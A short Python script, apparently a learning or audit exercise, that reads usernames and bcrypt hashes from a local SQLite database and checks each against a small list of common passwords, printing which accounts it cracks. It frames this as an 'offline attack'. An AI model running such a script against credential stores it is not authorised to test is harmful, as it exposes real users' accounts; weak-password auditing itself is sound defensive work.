import sqlite3
import bcrypt

conn = sqlite3.connect("vault.db")
cursor = conn.cursor()

common_passwords = [
    "123456",
    "password",
    "password123",
    "qwerty",
    "abc123",
    "admin",
    "welcome",
    "letmein"
]

cursor.execute("SELECT username , password_hash FROM users")
users = cursor.fetchall()

print("\n ===OFFLINE ATTACK STARTED=== \n")


for username, stored_hash in users:

    cracked = False

    for guess in common_passwords:

        if bcrypt.checkpw(
            guess.encode(),
            stored_hash.encode()
        ):

            print(f"[CRACKED] {username} -> {guess}")
            cracked = True
            break

    if not cracked:
        print(f"[SAFE] {username} password not found")

conn.close()